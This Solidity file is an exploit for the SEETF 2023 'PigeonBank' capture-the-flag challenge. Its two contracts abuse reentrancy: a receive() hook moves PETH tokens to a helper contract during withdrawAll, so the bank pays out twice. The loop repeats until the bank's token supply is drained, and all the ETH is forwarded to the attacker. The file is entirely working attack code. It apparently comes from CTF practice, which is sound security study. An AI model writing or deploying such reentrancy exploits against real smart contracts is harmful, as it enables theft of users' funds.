// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PigeonBank.sol";
import "hardhat/console.sol";


contract PigeonBankAttackHelperSEETF23 {
    function get(address _bank) public {
        PigeonBankSEETF23 bank = PigeonBankSEETF23(payable(_bank));
        bank.withdrawAll();
        (bool success, ) = address(msg.sender).call{value: address(this).balance}("");
        require(success);    
    }

    receive() external payable {}
}

contract PigeonBankAttackSEETF23 {
    
    PigeonBankSEETF23 public bank;
    PETHSEETF23 public peth;
    address public attacker;
    PigeonBankAttackHelperSEETF23 public helper;

    function attack(address target) public payable {
        attacker = msg.sender;
        helper = new PigeonBankAttackHelperSEETF23();

        bank = PigeonBankSEETF23(payable(target));
        peth = bank.peth();
                
        while(peth.totalSupply() != 0) {
            uint256 v = address(this).balance <= peth.totalSupply() ? address(this).balance : peth.totalSupply();
            bank.deposit{value: v}();
            bank.withdrawAll();
            helper.get(address(bank));
            // this.balance += deposit value, 
        }

        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        peth.transfer(address(helper), peth.balanceOf(address(this)));
    }

}
